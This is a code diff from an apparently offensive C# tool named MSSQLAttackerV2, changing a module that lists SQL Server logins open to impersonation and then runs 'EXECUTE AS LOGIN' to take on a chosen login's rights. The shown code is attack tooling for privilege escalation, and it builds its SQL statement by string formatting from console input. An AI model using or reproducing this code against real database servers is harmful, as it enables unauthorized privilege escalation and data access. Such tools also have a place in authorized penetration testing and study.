@@ -17,21 +17,26 @@ namespace MSSQLAttackerV2.Modules
             String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
             String impersonatableUsers = helpWrite.getFilteredResult(runQuery.getQueryResult(con, query));
             if (String.IsNullOrEmpty(impersonatableUsers)) { helpWrite.doWrite(0, "Impersonation Not Allowed"); return ""; }
-            helpWrite.doWrite(1, "Impersonatable Users: " + impersonatableUsers);
+            helpWrite.doWrite(1, "Impersonatable Users: \n" + impersonatableUsers);
             return impersonatableUsers;
 
         }
-        public void abuseImpersonation(SqlConnection con)
+        public void impersonate(SqlConnection con, [Optional, DefaultParameterValue(null)] String impersonateUser)
         {
             var runQuery = new RunQuery();
             var helpWrite = new Helpwrite();
             try
             {
-                String user = checkImpersonation(con).Trim('\r', '\n');
-                if (string.IsNullOrEmpty(user)) { return; };
-                String executeas = String.Format("EXECUTE AS LOGIN = '{0}';", user);
+                
+                while (string.IsNullOrEmpty(impersonateUser))
+                {
+                    Console.Write("Enter UserName to impersonate:");
+                    impersonateUser = Console.ReadLine();
+                }
+                if (string.IsNullOrEmpty(impersonateUser)) { return; };
+                String executeas = String.Format("EXECUTE AS LOGIN = '{0}';", impersonateUser);
                 String temp = runQuery.getQueryResult(con, executeas).ToString();
-                helpWrite.doWrite(1, "Impersonation Success");
+                helpWrite.doWrite(1, "Impersonation Success [" +impersonateUser+"]");
                 return;
             }
             catch (Exception)
@@ -44,6 +49,7 @@ namespace MSSQLAttackerV2.Modules
 
 
         }
+
         public string checkImpersonateDBO(SqlConnection con)
         {
             var runQuery = new RunQuery();
